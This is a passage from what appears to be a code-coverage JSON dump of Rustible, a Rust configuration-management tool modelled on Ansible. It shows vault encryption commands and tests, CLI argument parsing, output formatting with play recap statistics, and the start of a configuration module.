VaultEngine::new(password);\n\n                let plaintext = if let Some(ref s) = args.string {\n                    s.as_bytes().to_vec()\n                } else {\n                    let mut input = String::new();\n                    io::stdin().read_line(\u0026mut input)?;\n                    input.trim().as_bytes().to_vec()\n                };\n\n                let encrypted = engine.encrypt(\u0026plaintext)?;\n\n                if let Some(ref name) = args.name {\n                    println!(\"{}: !vault |\", name);\n                    for line in encrypted.lines() {\n                        println!(\"  {}\", line);\n                    }\n                } else {\n                    print!(\"{}\", encrypted);\n                }\n\n                Ok(0)\n            }\n\n            VaultAction::DecryptString(args) =\u003e {\n                let password = get_password(args.vault_password_file.as_ref(), ctx)?;\n                let engine = VaultEngine::new(password);\n\n                let decrypted = engine.decrypt(\u0026args.string)?;\n                println!(\"{}\", String::from_utf8_lossy(\u0026decrypted));\n\n                Ok(0)\n            }\n        }\n    }\n}\n\n#[async_trait::async_trait]\nimpl Runnable for VaultArgs {\n    async fn run(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        self.execute(ctx).await\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_encrypt_decrypt() {\n        let engine = VaultEngine::new(\"test_password\".to_string());\n\n        let plaintext = b\"Hello, World!\";\n        let encrypted = engine.encrypt(plaintext).unwrap();\n\n        assert!(VaultEngine::is_encrypted(\u0026encrypted));\n\n        let decrypted = engine.decrypt(\u0026encrypted).unwrap();\n        assert_eq!(decrypted, plaintext);\n    }\n\n    #[test]\n    fn test_wrong_password() {\n        let engine1 = VaultEngine::new(\"password1\".to_string());\n        let engine2 = VaultEngine::new(\"password2\".to_string());\n\n        let plaintext = b\"Secret data\";\n        let encrypted = engine1.encrypt(plaintext).unwrap();\n\n        let result = engine2.decrypt(\u0026encrypted);\n        assert!(result.is_err());\n    }\n\n    #[test]\n    fn test_is_encrypted() {\n        assert!(VaultEngine::is_encrypted(\n            \"$RUSTIBLE_VAULT;1.0;AES256-GCM\\ndata\"\n        ));\n        assert!(!VaultEngine::is_encrypted(\"plain text content\"));\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","cli","mod.rs"],"content":"//! CLI module for Rustible\n//!\n//! This module provides the command-line interface for Rustible,\n//! including argument parsing, configuration loading, and subcommand handling.\n\npub mod commands;\npub mod output;\n\nuse clap::{Parser, Subcommand, ValueEnum};\nuse std::path::PathBuf;\n\n/// Rustible - An Ansible substitute written in Rust\n///\n/// A fast, safe, and modern configuration management and automation tool.\n#[derive(Parser, Debug, Clone)]\n#[command(name = \"rustible\")]\n#[command(author = \"Rustible Contributors\")]\n#[command(version)]\n#[command(about = \"An Ansible substitute written in Rust\", long_about = None)]\n#[command(propagate_version = true)]\npub struct Cli {\n    /// Subcommand to execute\n    #[command(subcommand)]\n    pub command: Commands,\n\n    /// Path to inventory file or directory\n    #[arg(short = 'i', long, global = true, env = \"RUSTIBLE_INVENTORY\")]\n    pub inventory: Option\u003cPathBuf\u003e,\n\n    /// Extra variables (key=value or @file.yml)\n    #[arg(short = 'e', long = \"extra-vars\", global = true, action = clap::ArgAction::Append)]\n    pub extra_vars: Vec\u003cString\u003e,\n\n    /// Verbosity level (-v, -vv, -vvv, -vvvv)\n    #[arg(short = 'v', long, global = true, action = clap::ArgAction::Count)]\n    pub verbose: u8,\n\n    /// Run in check mode (dry-run, don't make changes)\n    #[arg(long = \"check\", global = true)]\n    pub check_mode: bool,\n\n    /// Run in diff mode (show differences)\n    #[arg(long = \"diff\", global = true)]\n    pub diff_mode: bool,\n\n    /// Output format\n    #[arg(long, global = true, default_value = \"human\")]\n    pub output: OutputFormat,\n\n    /// Limit execution to specific hosts (pattern)\n    #[arg(short = 'l', long, global = true)]\n    pub limit: Option\u003cString\u003e,\n\n    /// Number of parallel processes (forks)\n    #[arg(short = 'f', long, global = true, default_value = \"5\")]\n    pub forks: usize,\n\n    /// Connection timeout in seconds\n    #[arg(long, global = true, default_value = \"30\")]\n    pub timeout: u64,\n\n    /// Path to configuration file\n    #[arg(short = 'c', long, global = true, env = \"RUSTIBLE_CONFIG\")]\n    pub config: Option\u003cPathBuf\u003e,\n\n    /// Disable colored output\n    #[arg(long, global = true)]\n    pub no_color: bool,\n}\n\n/// Output format for CLI\n#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]\npub enum OutputFormat {\n    /// Human-readable output with colors\n    Human,\n    /// JSON output for scripting\n    Json,\n    /// YAML output\n    Yaml,\n    /// Minimal output (only errors)\n    Minimal,\n}\n\nimpl Default for OutputFormat {\n    fn default() -\u003e Self {\n        Self::Human\n    }\n}\n\n/// Available subcommands\n#[derive(Subcommand, Debug, Clone)]\npub enum Commands {\n    /// Run a playbook\n    Run(commands::run::RunArgs),\n\n    /// Run a playbook in check mode (dry-run)\n    Check(commands::check::CheckArgs),\n\n    /// List hosts in inventory\n    #[command(name = \"list-hosts\")]\n    ListHosts(commands::inventory::ListHostsArgs),\n\n    /// List tasks in a playbook\n    #[command(name = \"list-tasks\")]\n    ListTasks(commands::inventory::ListTasksArgs),\n\n    /// Vault operations (encrypt/decrypt secrets)\n    Vault(commands::vault::VaultArgs),\n\n    /// Initialize a new Rustible project\n    Init(InitArgs),\n\n    /// Validate playbook syntax\n    Validate(ValidateArgs),\n}\n\n/// Arguments for init command\n#[derive(Parser, Debug, Clone)]\npub struct InitArgs {\n    /// Directory to initialize (defaults to current directory)\n    #[arg(default_value = \".\")]\n    pub path: PathBuf,\n\n    /// Project template to use\n    #[arg(long, default_value = \"basic\")]\n    pub template: String,\n}\n\n/// Arguments for validate command\n#[derive(Parser, Debug, Clone)]\npub struct ValidateArgs {\n    /// Playbook file to validate\n    pub playbook: PathBuf,\n}\n\nimpl Cli {\n    /// Parse command-line arguments\n    pub fn parse_args() -\u003e Self {\n        Cli::parse()\n    }\n\n    /// Get the effective verbosity level (0-4)\n    pub fn verbosity(\u0026self) -\u003e u8 {\n        self.verbose.min(4)\n    }\n\n    /// Check if running in quiet mode\n    pub fn is_quiet(\u0026self) -\u003e bool {\n        matches!(self.output, OutputFormat::Minimal)\n    }\n\n    /// Check if JSON output is requested\n    pub fn is_json(\u0026self) -\u003e bool {\n        matches!(self.output, OutputFormat::Json)\n    }\n}\n\n/// Environment variable helper functions\npub mod env {\n    use std::env;\n    use std::path::PathBuf;\n\n    /// Get the Rustible home directory\n    #[allow(dead_code)]\n    pub fn rustible_home() -\u003e Option\u003cPathBuf\u003e {\n        env::var(\"RUSTIBLE_HOME\")\n            .ok()\n            .map(PathBuf::from)\n            .or_else(|| dirs::home_dir().map(|h| h.join(\".rustible\")))\n    }\n\n    /// Get the default inventory path\n    #[allow(dead_code)]\n    pub fn default_inventory() -\u003e Option\u003cPathBuf\u003e {\n        env::var(\"RUSTIBLE_INVENTORY\").ok().map(PathBuf::from)\n    }\n\n    /// Get the vault password file path\n    #[allow(dead_code)]\n    pub fn vault_password_file() -\u003e Option\u003cPathBuf\u003e {\n        env::var(\"RUSTIBLE_VAULT_PASSWORD_FILE\")\n            .ok()\n            .map(PathBuf::from)\n    }\n\n    /// Check if colors should be disabled\n    #[allow(dead_code)]\n    pub fn no_color() -\u003e bool {\n        env::var(\"NO_COLOR\").is_ok() || env::var(\"RUSTIBLE_NO_COLOR\").is_ok()\n    }\n\n    /// Get the SSH private key path\n    #[allow(dead_code)]\n    pub fn ssh_private_key() -\u003e Option\u003cPathBuf\u003e {\n        env::var(\"RUSTIBLE_SSH_KEY\").ok().map(PathBuf::from)\n    }\n\n    /// Get the remote user\n    #[allow(dead_code)]\n    pub fn remote_user() -\u003e Option\u003cString\u003e {\n        env::var(\"RUSTIBLE_REMOTE_USER\").ok()\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_cli_parsing() {\n        let cli = Cli::try_parse_from([\"rustible\", \"run\", \"playbook.yml\"]).unwrap();\n        assert!(matches!(cli.command, Commands::Run(_)));\n    }\n\n    #[test]\n    fn test_verbosity() {\n        let cli = Cli::try_parse_from([\"rustible\", \"-vvv\", \"run\", \"playbook.yml\"]).unwrap();\n        assert_eq!(cli.verbosity(), 3);\n    }\n\n    #[test]\n    fn test_extra_vars() {\n        let cli = Cli::try_parse_from([\n            \"rustible\",\n            \"-e\",\n            \"key1=value1\",\n            \"-e\",\n            \"key2=value2\",\n            \"run\",\n            \"playbook.yml\",\n        ])\n        .unwrap();\n        assert_eq!(cli.extra_vars.len(), 2);\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","cli","output.rs"],"content":"//! Output formatting module for Rustible\n//!\n//! Provides colored output, progress indicators, and various output formats.\n\nuse colored::Colorize;\nuse indicatif::{MultiProgress, ProgressBar, ProgressStyle};\nuse std::collections::HashMap;\nuse std::io::{self, Write};\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\n/// Task execution status\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\npub enum TaskStatus {\n    /// Task completed successfully with no changes\n    Ok,\n    /// Task completed with changes made\n    Changed,\n    /// Task was skipped\n    Skipped,\n    /// Task failed\n    Failed,\n    /// Task is unreachable (connection failed)\n    Unreachable,\n    /// Task is being rescued\n    Rescued,\n    /// Task is being ignored\n    Ignored,\n}\n\nimpl TaskStatus {\n    /// Get the colored string representation\n    pub fn colored_string(\u0026self) -\u003e String {\n        match self {\n            TaskStatus::Ok =\u003e \"ok\".green().to_string(),\n            TaskStatus::Changed =\u003e \"changed\".yellow().to_string(),\n            TaskStatus::Skipped =\u003e \"skipping\".cyan().to_string(),\n            TaskStatus::Failed =\u003e \"failed\".red().bold().to_string(),\n            TaskStatus::Unreachable =\u003e \"unreachable\".red().bold().to_string(),\n            TaskStatus::Rescued =\u003e \"rescued\".magenta().to_string(),\n            TaskStatus::Ignored =\u003e \"ignored\".blue().to_string(),\n        }\n    }\n\n    /// Get the plain string representation\n    pub fn as_str(\u0026self) -\u003e \u0026'static str {\n        match self {\n            TaskStatus::Ok =\u003e \"ok\",\n            TaskStatus::Changed =\u003e \"changed\",\n            TaskStatus::Skipped =\u003e \"skipping\",\n            TaskStatus::Failed =\u003e \"failed\",\n            TaskStatus::Unreachable =\u003e \"unreachable\",\n            TaskStatus::Rescued =\u003e \"rescued\",\n            TaskStatus::Ignored =\u003e \"ignored\",\n        }\n    }\n}\n\n/// Output formatter for different output modes\npub struct OutputFormatter {\n    /// Use colored output\n    use_color: bool,\n    /// JSON output mode\n    json_mode: bool,\n    /// Verbosity level\n    verbosity: u8,\n    /// Start time for duration calculations\n    start_time: Instant,\n    /// Multi-progress bar container\n    multi_progress: Option\u003cArc\u003cMultiProgress\u003e\u003e,\n}\n\nimpl OutputFormatter {\n    /// Create a new output formatter\n    pub fn new(use_color: bool, json_mode: bool, verbosity: u8) -\u003e Self {\n        // Respect NO_COLOR environment variable\n        let use_color = use_color \u0026\u0026 std::env::var(\"NO_COLOR\").is_err();\n\n        Self {\n            use_color,\n            json_mode,\n            verbosity,\n            start_time: Instant::now(),\n            multi_progress: None,\n        }\n    }\n\n    /// Initialize progress bar support\n    pub fn init_progress(\u0026mut self) {\n        if !self.json_mode {\n            self.multi_progress = Some(Arc::new(MultiProgress::new()));\n        }\n    }\n\n    /// Get the multi-progress bar container\n    pub fn multi_progress(\u0026self) -\u003e Option\u003cArc\u003cMultiProgress\u003e\u003e {\n        self.multi_progress.clone()\n    }\n\n    /// Print a banner/header\n    pub fn banner(\u0026self, title: \u0026str) {\n        if self.json_mode {\n            return;\n        }\n\n        let line = \"=\".repeat(title.len() + 4);\n        if self.use_color {\n            println!(\"\\n{}\", line.bright_blue());\n            println!(\"{}\", format!(\"  {}  \", title).bright_blue().bold());\n            println!(\"{}\\n\", line.bright_blue());\n        } else {\n            println!(\"\\n{}\", line);\n            println!(\"  {}  \", title);\n            println!(\"{}\\n\", line);\n        }\n    }\n\n    /// Print a section header\n    pub fn section(\u0026self, title: \u0026str) {\n        if self.json_mode {\n            return;\n        }\n\n        if self.use_color {\n            println!(\"\\n{}\", title.cyan().bold());\n            println!(\"{}\", \"-\".repeat(title.len()).cyan());\n        } else {\n            println!(\"\\n{}\", title);\n            println!(\"{}\", \"-\".repeat(title.len()));\n        }\n    }\n\n    /// Print a play header\n    pub fn play_header(\u0026self, play_name: \u0026str) {\n        if self.json_mode {\n            return;\n        }\n\n        let header = format!(\"PLAY [{}]\", play_name);\n        let stars = \"*\".repeat(80_usize.saturating_sub(header.len()));\n\n        if self.use_color {\n            println!(\n                \"\\n{} {}\",\n                header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"\\n{} {}\", header, stars);\n        }\n    }\n\n    /// Print a task header\n    pub fn task_header(\u0026self, task_name: \u0026str) {\n        if self.json_mode {\n            return;\n        }\n\n        let header = format!(\"TASK [{}]\", task_name);\n        let stars = \"*\".repeat(80_usize.saturating_sub(header.len()));\n\n        if self.use_color {\n            println!(\n                \"\\n{} {}\",\n                header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"\\n{} {}\", header, stars);\n        }\n    }\n\n    /// Print task result\n    pub fn task_result(\u0026self, host: \u0026str, status: TaskStatus, message: Option\u003c\u0026str\u003e) {\n        if self.json_mode {\n            let result = serde_json::json!({\n                \"host\": host,\n                \"status\": status.as_str(),\n                \"message\": message\n            });\n            println!(\"{}\", serde_json::to_string(\u0026result).unwrap());\n            return;\n        }\n\n        let status_str = if self.use_color {\n            status.colored_string()\n        } else {\n            status.as_str().to_string()\n        };\n\n        let host_str = if self.use_color {\n            host.bright_white().bold().to_string()\n        } else {\n            host.to_string()\n        };\n\n        match status {\n            TaskStatus::Ok\n            | TaskStatus::Changed\n            | TaskStatus::Skipped\n            | TaskStatus::Rescued\n            | TaskStatus::Ignored =\u003e {\n                print!(\"{}: [{}]\", status_str, host_str);\n            }\n            TaskStatus::Failed | TaskStatus::Unreachable =\u003e {\n                print!(\"{}: [{}]\", status_str, host_str);\n            }\n        }\n\n        if let Some(msg) = message {\n            print!(\" =\u003e {}\", msg);\n        }\n\n        println!();\n    }\n\n    /// Print task result with detailed output\n    pub fn task_result_verbose(\n        \u0026self,\n        host: \u0026str,\n        status: TaskStatus,\n        details: \u0026HashMap\u003cString, String\u003e,\n    ) {\n        if self.verbosity \u003c 1 {\n            return;\n        }\n\n        if self.json_mode {\n            let result = serde_json::json!({\n                \"host\": host,\n                \"status\": status.as_str(),\n                \"details\": details\n            });\n            println!(\"{}\", serde_json::to_string_pretty(\u0026result).unwrap());\n            return;\n        }\n\n        self.task_result(host, status, None);\n\n        for (key, value) in details {\n            if self.use_color {\n                println!(\"    {}: {}\", key.bright_black(), value);\n            } else {\n                println!(\"    {}: {}\", key, value);\n            }\n        }\n    }\n\n    /// Print a recap summary\n    pub fn recap(\u0026self, stats: \u0026RecapStats) {\n        if self.json_mode {\n            println!(\"{}\", serde_json::to_string_pretty(stats).unwrap());\n            return;\n        }\n\n        let header = \"PLAY RECAP\";\n        let stars = \"*\".repeat(80 - header.len());\n\n        if self.use_color {\n            println!(\n                \"\\n{} {}\",\n                header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"\\n{} {}\", header, stars);\n        }\n\n        for (host, host_stats) in \u0026stats.hosts {\n            let line = format!(\n                \"{:\u003c30} : ok={:\u003c4} changed={:\u003c4} unreachable={:\u003c4} failed={:\u003c4} skipped={:\u003c4} rescued={:\u003c4} ignored={:\u003c4}\",\n                host,\n                host_stats.ok,\n                host_stats.changed,\n                host_stats.unreachable,\n                host_stats.failed,\n                host_stats.skipped,\n                host_stats.rescued,\n                host_stats.ignored\n            );\n\n            if self.use_color {\n                let host_colored = if host_stats.failed \u003e 0 || host_stats.unreachable \u003e 0 {\n                    host.red().bold()\n                } else if host_stats.changed \u003e 0 {\n                    host.yellow()\n                } else {\n                    host.green()\n                };\n\n                // Helper to format stats: dim if zero, colored if non-zero\n                let fmt_stat = |label: \u0026str, value: u32, color: colored::Color| -\u003e String {\n                    if value \u003e 0 {\n                        format!(\"{}={:\u003c4}\", label.color(color), value)\n                    } else {\n                        format!(\"{}={:\u003c4}\", label, value).dimmed().to_string()\n                    }\n                };\n\n                print!(\"{:\u003c30} : \", host_colored);\n                print!(\"{} \", fmt_stat(\"ok\", host_stats.ok, colored::Color::Green));\n                print!(\n                    \"{} \",\n                    fmt_stat(\"changed\", host_stats.changed, colored::Color::Yellow)\n                );\n                print!(\n                    \"{} \",\n                    fmt_stat(\"unreachable\", host_stats.unreachable, colored::Color::Red)\n                );\n                print!(\n                    \"{} \",\n                    fmt_stat(\"failed\", host_stats.failed, colored::Color::Red)\n                );\n                print!(\n                    \"{} \",\n                    fmt_stat(\"skipped\", host_stats.skipped, colored::Color::Cyan)\n                );\n                print!(\n                    \"{} \",\n                    fmt_stat(\"rescued\", host_stats.rescued, colored::Color::Magenta)\n                );\n                print!(\n                    \"{} \",\n                    fmt_stat(\"ignored\", host_stats.ignored, colored::Color::Blue)\n                );\n                println!();\n            } else {\n                println!(\"{}\", line);\n            }\n        }\n\n        // Print duration\n        let duration = self.start_time.elapsed();\n        let duration_str = format_duration(duration);\n\n        if self.use_color {\n            println!(\n                \"\\n{} {}\",\n                \"Playbook run took\".bright_black(),\n                duration_str.bright_white()\n            );\n        } else {\n            println!(\"\\nPlaybook run took {}\", duration_str);\n        }\n    }\n\n    /// Print an error message\n    pub fn error(\u0026self, message: \u0026str) {\n        if self.json_mode {\n            let err = serde_json::json!({\n                \"type\": \"error\",\n                \"message\": message\n            });\n            eprintln!(\"{}\", serde_json::to_string(\u0026err).unwrap());\n            return;\n        }\n\n        if self.use_color {\n            eprintln!(\"{} {}\", \"ERROR:\".red().bold(), message);\n        } else {\n            eprintln!(\"ERROR: {}\", message);\n        }\n    }\n\n    /// Print a warning message\n    pub fn warning(\u0026self, message: \u0026str) {\n        if self.json_mode {\n            let warn = serde_json::json!({\n                \"type\": \"warning\",\n                \"message\": message\n            });\n            eprintln!(\"{}\", serde_json::to_string(\u0026warn).unwrap());\n            return;\n        }\n\n        if self.use_color {\n            eprintln!(\"{} {}\", \"WARNING:\".yellow().bold(), message);\n        } else {\n            eprintln!(\"WARNING: {}\", message);\n        }\n    }\n\n    /// Print an info message (respects verbosity)\n    pub fn info(\u0026self, message: \u0026str) {\n        if self.verbosity \u003c 1 {\n            return;\n        }\n\n        if self.json_mode {\n            let info = serde_json::json!({\n                \"type\": \"info\",\n                \"message\": message\n            });\n            println!(\"{}\", serde_json::to_string(\u0026info).unwrap());\n            return;\n        }\n\n        if self.use_color {\n            println!(\"{} {}\", \"INFO:\".blue(), message);\n        } else {\n            println!(\"INFO: {}\", message);\n        }\n    }\n\n    /// Print a debug message (requires higher verbosity)\n    pub fn debug(\u0026self, message: \u0026str) {\n        if self.verbosity \u003c 2 {\n            return;\n        }\n\n        if self.json_mode {\n            let debug = serde_json::json!({\n                \"type\": \"debug\",\n                \"message\": message\n            });\n            println!(\"{}\", serde_json::to_string(\u0026debug).unwrap());\n            return;\n        }\n\n        if self.use_color {\n            println!(\"{} {}\", \"DEBUG:\".magenta(), message);\n        } else {\n            println!(\"DEBUG: {}\", message);\n        }\n    }\n\n    /// Print a diff output\n    pub fn diff(\u0026self, old: \u0026str, new: \u0026str) {\n        if self.json_mode {\n            let diff = serde_json::json!({\n                \"type\": \"diff\",\n                \"before\": old,\n                \"after\": new\n            });\n            println!(\"{}\", serde_json::to_string(\u0026diff).unwrap());\n            return;\n        }\n\n        println!();\n        for line in old.lines() {\n            if self.use_color {\n                println!(\"{}\", format!(\"- {}\", line).red());\n            } else {\n                println!(\"- {}\", line);\n            }\n        }\n        for line in new.lines() {\n            if self.use_color {\n                println!(\"{}\", format!(\"+ {}\", line).green());\n            } else {\n                println!(\"+ {}\", line);\n            }\n        }\n        println!();\n    }\n\n    /// Create a progress bar for a task\n    pub fn create_progress_bar(\u0026self, len: u64, message: \u0026str) -\u003e Option\u003cProgressBar\u003e {\n        if self.json_mode {\n            return None;\n        }\n\n        let mp = self.multi_progress.as_ref()?;\n        let pb = mp.add(ProgressBar::new(len));\n\n        pb.set_style(\n            ProgressStyle::default_bar()\n                .template(\n                    \"{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} {msg}\",\n                )\n                .unwrap()\n                .progress_chars(\"#\u003e-\"),\n        );\n        pb.set_message(message.to_string());\n\n        Some(pb)\n    }\n\n    /// Create a spinner for indeterminate progress\n    pub fn create_spinner(\u0026self, message: \u0026str) -\u003e Option\u003cProgressBar\u003e {\n        if self.json_mode {\n            return None;\n        }\n\n        let mp = self.multi_progress.as_ref()?;\n        let sp = mp.add(ProgressBar::new_spinner());\n\n        sp.set_style(\n            ProgressStyle::default_spinner()\n                .template(\"{spinner:.green} {msg}\")\n                .unwrap(),\n        );\n        sp.set_message(message.to_string());\n        sp.enable_steady_tick(Duration::from_millis(100));\n\n        Some(sp)\n    }\n\n    /// Print a list of items\n    pub fn list(\u0026self, title: \u0026str, items: \u0026[String]) {\n        if self.json_mode {\n            let list = serde_json::json!({\n                \"type\": \"list\",\n                \"title\": title,\n                \"items\": items\n            });\n            println!(\"{}\", serde_json::to_string_pretty(\u0026list).unwrap());\n            return;\n        }\n\n        if self.use_color {\n            println!(\"\\n{}:\", title.bright_white().bold());\n        } else {\n            println!(\"\\n{}:\", title);\n        }\n\n        for item in items {\n            if self.use_color {\n                println!(\"  {} {}\", \"-\".bright_black(), item);\n            } else {\n                println!(\"  - {}\", item);\n            }\n        }\n    }\n\n    /// Print a table\n    pub fn table(\u0026self, headers: \u0026[\u0026str], rows: \u0026[Vec\u003cString\u003e]) {\n        if self.json_mode {\n            let table = serde_json::json!({\n                \"type\": \"table\",\n                \"headers\": headers,\n                \"rows\": rows\n            });\n            println!(\"{}\", serde_json::to_string_pretty(\u0026table).unwrap());\n            return;\n        }\n\n        // Calculate column widths\n        let mut widths: Vec\u003cusize\u003e = headers.iter().map(|h| h.len()).collect();\n        for row in rows {\n            for (i, cell) in row.iter().enumerate() {\n                if i \u003c widths.len() {\n                    widths[i] = widths[i].max(cell.len());\n                }\n            }\n        }\n\n        // Print header\n        let mut header_line = String::new();\n        for (i, h) in headers.iter().enumerate() {\n            if i \u003e 0 {\n                header_line.push_str(\" | \");\n            }\n            header_line.push_str(\u0026format!(\"{:width$}\", h, width = widths[i]));\n        }\n\n        if self.use_color {\n            println!(\"{}\", header_line.bright_white().bold());\n        } else {\n            println!(\"{}\", header_line);\n        }\n\n        // Print separator\n        let sep: Vec\u003cString\u003e = widths.iter().map(|w| \"-\".repeat(*w)).collect();\n        if self.use_color {\n            println!(\"{}\", sep.join(\"-+-\").bright_black());\n        } else {\n            println!(\"{}\", sep.join(\"-+-\"));\n        }\n\n        // Print rows\n        for row in rows {\n            let mut row_line = String::new();\n            for (i, cell) in row.iter().enumerate() {\n                if i \u003e 0 {\n                    row_line.push_str(\" | \");\n                }\n                if i \u003c widths.len() {\n                    row_line.push_str(\u0026format!(\"{:width$}\", cell, width = widths[i]));\n                }\n            }\n            println!(\"{}\", row_line);\n        }\n    }\n\n    /// Flush stdout\n    pub fn flush(\u0026self) {\n        let _ = io::stdout().flush();\n    }\n}\n\n/// Statistics for a single host\n#[derive(Debug, Clone, Default, serde::Serialize)]\npub struct HostStats {\n    pub ok: u32,\n    pub changed: u32,\n    pub unreachable: u32,\n    pub failed: u32,\n    pub skipped: u32,\n    pub rescued: u32,\n    pub ignored: u32,\n}\n\nimpl HostStats {\n    /// Create new empty stats\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Record a task status\n    pub fn record(\u0026mut self, status: TaskStatus) {\n        match status {\n            TaskStatus::Ok =\u003e self.ok += 1,\n            TaskStatus::Changed =\u003e self.changed += 1,\n            TaskStatus::Skipped =\u003e self.skipped += 1,\n            TaskStatus::Failed =\u003e self.failed += 1,\n            TaskStatus::Unreachable =\u003e self.unreachable += 1,\n            TaskStatus::Rescued =\u003e self.rescued += 1,\n            TaskStatus::Ignored =\u003e self.ignored += 1,\n        }\n    }\n\n    /// Check if there were any failures\n    pub fn has_failures(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n}\n\n/// Recap statistics for all hosts\n#[derive(Debug, Clone, Default, serde::Serialize)]\npub struct RecapStats {\n    pub hosts: HashMap\u003cString, HostStats\u003e,\n}\n\nimpl RecapStats {\n    /// Create new empty recap stats\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Record a task result for a host\n    pub fn record(\u0026mut self, host: \u0026str, status: TaskStatus) {\n        self.hosts\n            .entry(host.to_string())\n            .or_default()\n            .record(status);\n    }\n\n    /// Check if any host had failures\n    pub fn has_failures(\u0026self) -\u003e bool {\n        self.hosts.values().any(|h| h.has_failures())\n    }\n\n    /// Get total task count\n    pub fn total_tasks(\u0026self) -\u003e u32 {\n        self.hosts\n            .values()\n            .map(|h| {\n                h.ok + h.changed + h.failed + h.unreachable + h.skipped + h.rescued + h.ignored\n            })\n            .sum()\n    }\n}\n\n/// Format a duration as a human-readable string\nfn format_duration(duration: Duration) -\u003e String {\n    let secs = duration.as_secs();\n    let millis = duration.subsec_millis();\n\n    if secs \u003e= 3600 {\n        let hours = secs / 3600;\n        let mins = (secs % 3600) / 60;\n        let secs = secs % 60;\n        format!(\"{}h {}m {}s\", hours, mins, secs)\n    } else if secs \u003e= 60 {\n        let mins = secs / 60;\n        let secs = secs % 60;\n        format!(\"{}m {}s\", mins, secs)\n    } else if secs \u003e 0 {\n        format!(\"{}.{:03}s\", secs, millis)\n    } else {\n        format!(\"{}ms\", millis)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_task_status_display() {\n        assert_eq!(TaskStatus::Ok.as_str(), \"ok\");\n        assert_eq!(TaskStatus::Changed.as_str(), \"changed\");\n        assert_eq!(TaskStatus::Failed.as_str(), \"failed\");\n\n        // Test colored string content (without color codes for simplicity if we could strip them, but here we just check availability)\n        // Note: Colored strings contain ANSI codes, so we can't easily assert equality with plain text.\n        // But we can check it doesn't contain the old brackets\n        assert!(!TaskStatus::Ok.colored_string().contains(\"[+]\"));\n        assert!(!TaskStatus::Changed.colored_string().contains(\"[~]\"));\n        assert!(!TaskStatus::Failed.colored_string().contains(\"[!]\"));\n\n        // It should contain the text\n        assert!(TaskStatus::Ok.colored_string().contains(\"ok\"));\n        assert!(TaskStatus::Changed.colored_string().contains(\"changed\"));\n    }\n\n    #[test]\n    fn test_host_stats() {\n        let mut stats = HostStats::new();\n        stats.record(TaskStatus::Ok);\n        stats.record(TaskStatus::Changed);\n        stats.record(TaskStatus::Failed);\n\n        assert_eq!(stats.ok, 1);\n        assert_eq!(stats.changed, 1);\n        assert_eq!(stats.failed, 1);\n        assert!(stats.has_failures());\n    }\n\n    #[test]\n    fn test_recap_stats() {\n        let mut recap = RecapStats::new();\n        recap.record(\"host1\", TaskStatus::Ok);\n        recap.record(\"host1\", TaskStatus::Changed);\n        recap.record(\"host2\", TaskStatus::Failed);\n\n        assert!(recap.has_failures());\n        assert_eq!(recap.total_tasks(), 3);\n    }\n\n    #[test]\n    fn test_format_duration() {\n        assert_eq!(format_duration(Duration::from_millis(500)), \"500ms\");\n        assert_eq!(format_duration(Duration::from_secs(5)), \"5.000s\");\n        assert_eq!(format_duration(Duration::from_secs(65)), \"1m 5s\");\n        assert_eq!(format_duration(Duration::from_secs(3665)), \"1h 1m 5s\");\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","config.rs"],"content":"//! Configuration module for Rustible\n//!\n//! Handles loading and merging configuration from multiple sources:\n//! - Default values\n//! - System configuration (/etc/rustible/rustible.cfg)\n//! - User configuration (~/.rustible.cfg)\n//! - Project configuration (./rustible.cfg)\n//! - Environment variables\n//! - Command-line arguments\n\nuse anyhow::{Context, Result};\nuse serde::{Deserialize, Serialize};\nuse std::collections::HashMap;\nuse std::path::PathBuf;\n\n/// Main configuration structure\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct Config {\n    /// Default settings\n    pub defaults: Defaults,\n\n    /// Connection settings\n    pub connection: ConnectionConfig,\n\n    /// Privilege escalation settings\n    pub privilege_escalation: PrivilegeEscalation,\n\n    /// SSH settings\n    pub ssh: SshConfig,\n\n    /// Colors and output settings\n    pub colors: ColorsConfig,\n\n    /// Logging settings\n    pub logging: LoggingConfig,\n\n    /// Vault settings\n    pub vault: VaultConfig,\n\n    /// Galaxy settings (for roles/collections)\n    pub galaxy: GalaxyConfig,\n\n    /// Custom module paths\n    #[serde(default)]\n    pub module_paths: Vec\u003cPathBuf\u003e,\n\n    /// Custom role paths\n    #[serde(default)]\n    pub role_paths: Vec\u003cPathBuf\u003e,\n\n    /// Environment variables to pass to modules\n    #[serde(default)]\n    pub environment: HashMap\u003cString, String\u003e,\n}\n\nimpl Default for Config {\n    fn default() -\u003e Self {\n        Self {\n            defaults: Defaults::default(),\n            connection: ConnectionConfig::default(),\n            privilege_escalation: PrivilegeEscalation::default(),\n            ssh: SshConfig::default(),\n            colors: ColorsConfig::default(),\n            logging: LoggingConfig::default(),\n            vault: VaultConfig::default(),\n            galaxy: GalaxyConfig::default(),\n            module_paths: vec![],\n            role_paths: vec![],\n            environment: HashMap::new(),\n        }\n    }\n}\n\n/// Default configuration values\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct Defaults {\n    /// Default inventory path\n    pub inventory: Option\u003cPathBuf\u003e,\n\n    /// Default remote user\n    pub remote_user: Option\u003cString\u003e,\n\n    /// Default number of forks (parallel processes)\n    pub forks: 